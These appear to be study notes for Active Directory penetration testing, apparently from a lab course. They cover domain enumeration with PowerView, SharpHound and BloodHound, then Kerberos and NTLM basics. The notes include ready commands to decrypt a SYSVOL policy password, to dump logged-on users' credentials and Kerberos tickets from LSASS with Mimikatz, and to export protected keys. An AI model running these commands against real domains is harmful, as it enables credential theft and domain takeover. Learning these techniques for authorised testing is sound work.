# Enumeration
## Enumeration Using Legacy Windows Tools
- Get users in the domain
```
net user /domain
```
- Get specific user details in the domain
```
net user <username> /domain
```
- Get groups in the domain
```
net group /domain
```
- Get group details in the domain
```
net group "<group-name>" /domain
```
- We can obtain the IP address and port number of applications running on servers integrated with AD by simply enumerating all Service Principal Names in the domain. Since the information is registered and stored in AD, it is present on the domain controller. To obtain the data, we will again query the DC, this time searching for specific SPNs. (SECOND METHOD IS IN POWERVIEW)
```
setspn -L <domain-user-name>
```
## PowerShell and .NET Classes
PowerShell cmdlets like `Get-ADUser` work well but they are only installed by default on domain controllers as part of the Remote Server Administration Tools (RSAT).
- Getting the required hostname for the PDC - `PdcRoleOwner` (PS)
```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```
- Getting the DN
```
([adsi]'').distinguishedName
```
- Getting LDAP URL. Example: `LDAP://DC1.corp.com/DC=corp,DC=com`
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```
- Getting `DirectoryEntry`
```
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
```
- Getting `DirectorySearcher`
```
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```
- Enumerate all the users in DC
```
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$dirsearcher.FindAll()
```
## [PoverView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- Import the module
```
Import-Module .\PowerView.ps1
```
- Getting the DC information
```
Get-NetDomain
```
- Get User details
```
Get-NetUser
```
It is possible to filter it too:
```
Get-NetUser | select cn
```
```
Get-NetUser | select cn,pwdlastset,lastlogon
```
- Getting Group details
```
Get-NetGroup | select cn
```
- Getting group members
```
Get-NetGroup "Sales Department" | select member
```
- https://powersploit.readthedocs.io/en/latest/Recon/
- Get computer details
```
Get-NetComputer
```
- Scanning the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
```
Find-LocalAdminAccess
```
- Which user is logged in to which computer
```
Get-NetSession -ComputerName <computer-name> -Verbose
```
- Enumerating Service Principal Names 
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
### Enumerating Object Permissions
Juicy Permissions:
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
- Enumerate the user's ACE (Access Control Entry). The main points are `ObjectSID`, `ActiveDirectoryRights`, `SecurityIdentifier`.
```
Get-ObjectAcl -Identity <username>
```
- Conver SID to Name
```
Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
```
- Check if any users have GenericAll permissions
```
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
- Find interesting ACLs
```
Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft
```
### Enumerating Domain Shares
- Finding shares in the domain
```
Find-DomainShare
```
- Finding accessible shares in the domain for the current user
```
Find-DomainShare -CheckShareAccess
```
- SYSVOL share
```
ls \\dc1.corp.com\sysvol\corp.com\

# Finding old policy file
ls \\dc1.corp.com\sysvol\corp.com\Policies\

#Find password in it
cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml

#Decrypt the password
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
```
## PsLoggedOn
- To find logged on users on hosts
```
.\PsLoggedon.exe \\files04
```
---
## [SharpHound](https://github.com/BloodHoundAD/SharpHound)
Data Collector for BloodHound
- Import the script
```
Import-Module .\Sharphound.ps1
```
- we'll attempt to gather All data, which will perform all collection methods except for local group policies.
```
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```
Now transfer `.zip` file to the Kali. `.bin` file is a cache file and it is not required. It is okay to delete it.
## [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- Start Neo4j db
```
sudo neo4j start
```
- Initialize Neo4j (neo4j:neo4j)
```
http://localhost:7474
```
- Start Bloodhound
```
bloodhound
```
1. Connet neo4j (neo4j:Neo4j)
2. Upload Data
3. Analyze
Note: This plays directly into the second Shortest Path we'd like to show for this Module, namely the Shortest Paths to Domain Admins from Owned Principals. If we run this query against corp.com without configuring BloodHound, we receive a "NO DATA RETURNED FROM QUERY" message. However, the Owned Principals plays a big role here, and refers to the objects we are currently in control of in the domain. In order to analyze, we can mark any object we'd like as owned in BloodHound, even if we haven't obtained access to them. Sometimes it is a good idea to think in the lines of "what if" when it comes to AD assessments. In this case however, we will leave the imagination on the side and focus on the objects we in fact have control over. In order for us to obtain an owned principal in BloodHound, we will run a search (top left), right click the object that shows in the middle of the screen, and click Mark User as Owned. A principal marked as owned is shown in BloodHound with a skull icon next to the node itself. We'll repeat the process for CLIENT75 as well, however in this case we click Mark Computer as Owned, and we end up having two owned principals. Now that we informed BloodHound about our owned principals, we can run the Shortest Paths to Domain Admins from Owned Principals query.
---
# Authentication
## NTLM
- NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server.
- Challenge-and-response paradigm
## Kerberos
- Uses a ticket system
```
Authentication Server Request (AS-REQ)
Authentication Server Reply (AS-REP)
Key Distribution Center (KDC)
Ticket Granting Ticket (TGT)
Ticket Granting Service Request (TGS-REQ)
Ticket Granting Server Reply (TGS-REP)
```
## Cached AD Credentials
```
Local Security Authority Subsystem Service (LSASS)
```
- execute Mimikatz directly from memory using an injector like PowerShell
- use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and then load the data into Mimikatz
```
.\mimikatz.exe
```
- privilege::debug to engage the SeDebugPrivlege privilege, which will allow us to interact with a process owned by another account.
```
privilege::debug
```
- sekurlsa::logonpasswords to dump the credentials of all logged-on users
```
sekurlsa::logonpasswords
```
A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets.
- List the contents of the SMB share on WEB04 with UNC path \\web04.corp.com\backup. This will create and cache a service ticket.
```
dir \\web04.corp.com\backup
```
- Use Mimikatz to show the tickets that are stored in memory by entering `sekurlsa::tickets`.
```
sekurlsa::tickets
```
The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain.
### Digital Certificates
We can rely again on Mimikatz to accomplish this. The crypto module contains the capability to either patch the CryptoAPI function with `crypto::capi` or KeyIso service with `crypto::cng`, making non-exportable keys exportable.


































